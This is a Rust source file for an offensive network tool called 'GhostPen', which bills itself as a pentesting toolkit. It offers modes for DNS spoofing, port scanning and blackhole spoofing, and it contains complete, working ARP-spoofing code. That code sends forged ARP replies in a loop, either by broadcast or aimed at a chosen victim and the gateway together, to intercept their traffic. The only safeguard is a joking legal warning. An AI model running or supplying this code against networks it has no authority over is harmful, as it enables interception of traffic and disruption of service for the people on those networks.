mod blackholespoof;
mod dns_spoof;
mod mac;
mod mode;
mod portscan;
mod dos_attack;
mod dhcp_spoof;

use colored::Colorize;
use mode::select_mode;
use pnet::datalink::{self, Channel::Ethernet, MacAddr};
use pnet::packet::arp::{ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::io::{self, Write};
use std::net::Ipv4Addr;
use std::thread;
use std::time::Duration;

fn get_interface_input() -> String {
    println!("{}", "Available interfaces:".green().bold());
    for iface in datalink::interfaces() {
        println!("{}", iface.name.red().bold());
    }
    print!("Interface: ");
    io::stdout().flush().unwrap();
    let mut iface = String::new();
    io::stdin().read_line(&mut iface).unwrap();
    iface.trim().to_string()
}

fn get_ip_input(prompt: &str) -> Ipv4Addr {
    print!("{}: ", prompt);
    io::stdout().flush().unwrap();
    let mut ip = String::new();
    io::stdin().read_line(&mut ip).unwrap();
    ip.trim().parse().unwrap()
}

fn main() {
    println!(
        "{}",
        "Welcome to GhostPen, your pentesting toolkit written in rust."
            .green()
            .bold()
    );
    let selected_mode = select_mode();

    let warnings = [
        "THIS TOOL IS ONLY FOR PENETRATION TESTING AND NOT FOR ILLEGAL PURPOSES",
        "ABUSE IS GOING TO BE PUNISHED!!! IDK BY WHO...",
    ];
    for warning in warnings.iter() {
        println!("{}", warning.red().bold());
    }
    println!("You have selected {}.", selected_mode.green().bold());

    println!(
        "{}",
        "------------------------\n=======next step:=======\n------------------------\n"
            .yellow()
            .bold()
    );

    match selected_mode {
        "Blackhole Spoof" => {
            blackholespoof::meow();
        }
        "Port Scan" => {
            println!("Scan IP:");
            let mut ip = String::new();
            io::stdin().read_line(&mut ip).expect("Failed to read line");
            portscan::scan(ip.trim().parse().unwrap());
        }
        "DNS Spoof" => {
            dns_spoof::main();
        }
        "DHCP Spoof" => {
            todo!()
        }
        "DoS Attack" => {}
        "ARP Spoof" => {
            print!("Mode (broadcast/targeted): ");
            io::stdout().flush().unwrap();
            let mut mode = String::new();
            io::stdin().read_line(&mut mode).unwrap();
            let mode = mode.trim().to_ascii_lowercase();

            let iface = get_interface_input();
            let gateway_ip_addr = get_ip_input("Gateway IP");

            let victim_ip_addr = if mode == "targeted" {
                Some(get_ip_input("Victim IP"))
            } else {
                None
            };

            let attacker_mac = mac_address::mac_address_by_name(&iface)
                .unwrap()
                .unwrap()
                .bytes();
            let attacker_mac = MacAddr::new(
                attacker_mac[0],
                attacker_mac[1],
                attacker_mac[2],
                attacker_mac[3],
                attacker_mac[4],
                attacker_mac[5],
            );

            let interfaces = datalink::interfaces();
            let interface = interfaces
                .into_iter()
                .find(|i| i.name == iface)
                .expect("Interface not found");
            let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, _)) => (tx, ()),
                Ok(_) => panic!("Unhandled channel type"),
                Err(e) => panic!("Error creating datalink channel: {}", e),
            };

            println!("Starting ARP spoofing... Press Ctrl+C to stop");
            loop {
                if mode == "broadcast" {
                    let mut arp_buffer = [0u8; 28];
                    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
                    arp_packet.set_operation(ArpOperations::Reply);
                    arp_packet.set_sender_hw_addr(attacker_mac);
                    arp_packet.set_sender_proto_addr(gateway_ip_addr);
                    arp_packet.set_target_hw_addr(MacAddr::broadcast());
                    arp_packet.set_target_proto_addr(Ipv4Addr::new(0, 0, 0, 0));

                    let mut ethernet_buffer = [0u8; 42];
                    let mut ethernet_packet =
                        MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
                    ethernet_packet.set_destination(MacAddr::broadcast());
                    ethernet_packet.set_source(attacker_mac);
                    ethernet_packet.set_ethertype(EtherTypes::Arp);
                    ethernet_packet.set_payload(arp_packet.packet_mut());

                    tx.send_to(ethernet_packet.packet(), None);
                } else if let Some(victim_ip_addr) = victim_ip_addr {
                    let victim_ip = victim_ip_addr;
                    let victim_mac = mac::find_mac(&iface, &victim_ip.to_string(), "Victim")
                        .expect("Victim MAC not found. Is the host up?");
                    let gateway_mac =
                        mac::find_mac(&iface, &gateway_ip_addr.to_string(), "Gateway")
                            .expect("Gateway MAC not found. Is the host up?");

                    let mut arp_buffer1 = [0u8; 28];
                    let mut arp_packet1 = MutableArpPacket::new(&mut arp_buffer1).unwrap();
                    arp_packet1.set_operation(ArpOperations::Reply);
                    arp_packet1.set_sender_hw_addr(attacker_mac);
                    arp_packet1.set_sender_proto_addr(gateway_ip_addr);
                    arp_packet1.set_target_hw_addr(victim_mac);
                    arp_packet1.set_target_proto_addr(victim_ip);

                    let mut ethernet_buffer1 = [0u8; 42];
                    let mut ethernet_packet1 =
                        MutableEthernetPacket::new(&mut ethernet_buffer1).unwrap();
                    ethernet_packet1.set_destination(victim_mac);
                    ethernet_packet1.set_source(attacker_mac);
                    ethernet_packet1.set_ethertype(EtherTypes::Arp);
                    ethernet_packet1.set_payload(arp_packet1.packet_mut());

                    let mut arp_buffer2 = [0u8; 28];
                    let mut arp_packet2 = MutableArpPacket::new(&mut arp_buffer2).unwrap();
                    arp_packet2.set_operation(ArpOperations::Reply);
                    arp_packet2.set_sender_hw_addr(attacker_mac);
                    arp_packet2.set_sender_proto_addr(victim_ip);
                    arp_packet2.set_target_hw_addr(gateway_mac);
                    arp_packet2.set_target_proto_addr(gateway_ip_addr);

                    let mut ethernet_buffer2 = [0u8; 42];
                    let mut ethernet_packet2 =
                        MutableEthernetPacket::new(&mut ethernet_buffer2).unwrap();
                    ethernet_packet2.set_destination(gateway_mac);
                    ethernet_packet2.set_source(attacker_mac);
                    ethernet_packet2.set_ethertype(EtherTypes::Arp);
                    ethernet_packet2.set_payload(arp_packet2.packet_mut());

                    tx.send_to(ethernet_packet1.packet(), None);
                    tx.send_to(ethernet_packet2.packet(), None);
                } else {
                    println!("Invalid mode selected");
                    break;
                }
            }
        }
        _ => {
            println!("Unknown mode selected");
        }
    }
}
